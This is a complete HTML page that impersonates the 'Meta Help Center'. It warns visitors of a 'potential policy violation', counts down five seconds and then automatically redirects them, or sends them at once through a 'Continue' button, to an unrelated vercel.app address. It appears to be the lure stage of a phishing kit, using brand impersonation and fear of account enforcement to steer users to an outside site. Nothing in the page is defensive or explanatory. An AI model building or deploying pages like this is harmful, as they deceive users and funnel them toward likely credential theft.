<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Meta Help Center</title>

<style>
body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  background: #f8d7da;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.alert-box {
  background: white;
  padding: 30px;
  border-radius: 10px;
  width: 360px;
  text-align: center;
  box-shadow: 0 0 15px rgba(0,0,0,0.2);
}

.alert-box h2 {
  color: #c82333;
}

.alert-box p {
  color: #333;
  margin: 10px 0;
}

#countdown {
  font-weight: bold;
  color: #c82333;
  font-size: 18px;
}

.loader {
  margin: 20px auto;
  border: 6px solid #eee;
  border-top: 6px solid #c82333;
  border-radius: 50%;
  width: 40px;
  height: 40px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  100% { transform: rotate(360deg); }
}

.button {
  margin-top: 15px;
  padding: 10px 20px;
  background: #c82333;
  color: white;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}

.button:hover {
  background: #a71d2a;
}
</style>
</head>
<body>

<div class="alert-box">
  <h2>Meta Help Center</h2>
  <p>We are reviewing a potential policy violation.</p>
  <p>Redirecting in <span id="countdown">5</span> seconds...</p>
  <div class="loader"></div>
  <button class="button" onclick="redirectNow()">Continue</button>
</div>

<script>
var seconds = 5;

var countdownInterval = setInterval(function() {
  seconds--;
  document.getElementById("countdown").textContent = seconds;

  if (seconds <= 0) {
    clearInterval(countdownInterval);
    window.location.href = "https://info-review-here.vercel.app/"; 
  }
}, 1000);

function redirectNow() {
  window.location.href = "https://info-review-here.vercel.app/";
}
</script>

</body>
</html>
